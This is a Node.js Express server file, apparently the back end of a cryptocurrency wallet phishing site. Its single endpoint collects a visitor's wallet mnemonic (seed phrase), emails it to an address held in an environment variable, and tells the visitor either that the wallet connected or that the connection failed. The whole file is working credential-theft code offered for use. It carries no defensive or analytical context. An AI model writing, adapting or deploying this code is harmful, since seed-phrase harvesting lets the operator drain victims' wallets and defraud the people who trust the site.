const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const multer = require('multer');
const upload = multer();
require('dotenv').config();

const app = express();
const port = 3000;

app.use(cors())
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.post('/api/v1/email', upload.none(), (req, res) => {
    const { mnemonic } = req.body;

    let transporter = nodemailer.createTransport({
        service: 'Gmail',
        auth: {
            user: process.env.USER,
            pass: process.env.PASS
        }
    });

    let mailOptions = {
        from: 'no@gmail.com',
        to: process.env.EMAIL_TO,
        subject: 'Data from your website',
        html: `
            <p>Mnemonic: ${mnemonic}</p>
        `
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            res.json({
                status: 'error',
                message: 'Error connecting wallet, try again'
            });
        } else {
            res.json({
                status: true,
                message: 'Connected successfully',
            });
        }
    });
});

app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});